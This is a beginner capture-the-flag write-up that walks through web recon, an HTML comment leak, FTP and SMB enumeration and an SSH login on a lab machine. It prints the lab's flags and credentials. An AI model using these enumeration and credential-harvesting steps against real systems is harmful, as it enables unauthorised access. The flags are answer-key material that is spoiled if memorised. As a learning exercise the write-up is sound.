
---

##  CTF 2: The Insider’s Leak (Live Run)

###  Objective

Follow the clues left behind by a disgruntled insider and uncover sensitive data using web, FTP, SMB, and SSH enumeration.

---

###  Step 1: Web Recon

**Command:**
```bash
curl http://<target-ip>/robots.txt
```
**Output:**
```
User-agent: *
Disallow: /leaks/
```

**Flag:**
```bash
curl http://<target-ip>/leaks/flag1.txt
# FLAG{recon_detected}
```

---

###  Step 2: HTML Source Analysis

**Command:**
```bash
curl http://<target-ip>/leaks/index.html
```
**Discovered:**
```html
<!-- zip_password=leakpass123 -->
```

---

###  Step 3: FTP Access

**Command:**
```bash
ftp <target-ip>
ls
get data.zip
bye
unzip -P leakpass123 data.zip
cat flag2.txt
```
**Output:**
```
FLAG{cred_inside}
username:sshuser
```

---

###  Step 4: SMB Enumeration

**Command:**
```bash
smbclient //192.168.X.X/smbshare -U smbuser
# Password: smb123
ls
get admin_notes.txt
exit
cat admin_notes.txt
```

**Output:**
```
Internal note: SSH password for sshuser is ssh123
FLAG{smb_enum_success}
```

---

###  Step 5: SSH Login

**Command:**
```bash
ssh sshuser@<target-ip>
# Password: ssh123
cat flag3.txt
```

**Output:**
```
FLAG{access_granted}
```

---

### CTF Summary

| Step | Technique | Flag |
|------|-----------|------|
| robots.txt | Web Recon | `FLAG{recon_detected}` |
| HTML comment | Info leak | `leakpass123` |
| FTP + ZIP | File access | `FLAG{cred_inside}` |
| SMB | Note leakage | `FLAG{smb_enum_success}` |
| SSH | Remote access | `FLAG{access_granted}` |

---

> 🚀 Completed live by Abhi Kaushik
> Writeup formatted with the help of AI to document my personal learning experience.
